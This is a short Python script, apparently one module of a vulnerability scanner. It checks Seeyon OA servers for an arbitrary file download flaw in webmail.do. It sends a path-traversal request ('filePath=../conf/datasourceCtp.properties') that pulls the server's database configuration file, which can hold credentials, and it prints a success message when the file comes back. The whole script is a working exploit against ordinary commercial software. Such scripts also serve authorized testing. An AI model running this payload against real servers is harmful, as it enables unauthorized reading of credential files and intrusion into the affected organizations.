import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging



def 致远OA_webmail_任意文件下载(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + "seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "workflow" in response.text:
            print(Vcolors.RED +"[SUCCESS]  目标 {} 存在致远OA webmail.do 任意文件下载漏洞, 响应为: \n\n{}".format(vuln_url,response) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在致远OA webmail.do 任意文件下载漏洞"+Vcolors.ENDC)
    except:
        logging.error("致远OA_webmail_任意文件下载脚本出现异常")



